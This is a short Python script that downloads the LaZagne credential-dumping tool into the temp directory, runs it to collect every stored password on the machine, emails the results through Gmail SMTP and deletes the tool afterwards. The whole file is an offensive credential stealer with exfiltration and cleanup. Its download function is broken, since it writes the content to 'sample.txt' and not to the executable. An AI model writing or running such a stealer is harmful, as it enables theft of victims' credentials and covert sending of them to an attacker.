#!/usr/bin/env python
from typing import Union

import requests, subprocess, smtplib, os, tempfile, pynput


def download(url):
    # Getting response using requsts 'GET'
    get_response = requests.get(url)
    # Getting file name
    file_name = url.split("/")[-1]
    # Saving answer to file
    with open("sample.txt", "w") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    # Creating SMTP server instance of gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # Initiate TLS server
    server.starttls()
    # Login to email
    server.login(email, password)
    # Send mail
    server.sendmail(email, email, message)
    # Stopping the server
    server.quit()


# Navigating to temp directory
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
# Downloading laZagne
download("http://localhost/lazagne.exe")
# laZagne result
result = subprocess.check_output("lazagne.exe all",shell=True)

# Sending result by email
send_mail("example@gmail.com", "password", result)

# Deleting laZagne after using it
os.remove("lazagne.exe")

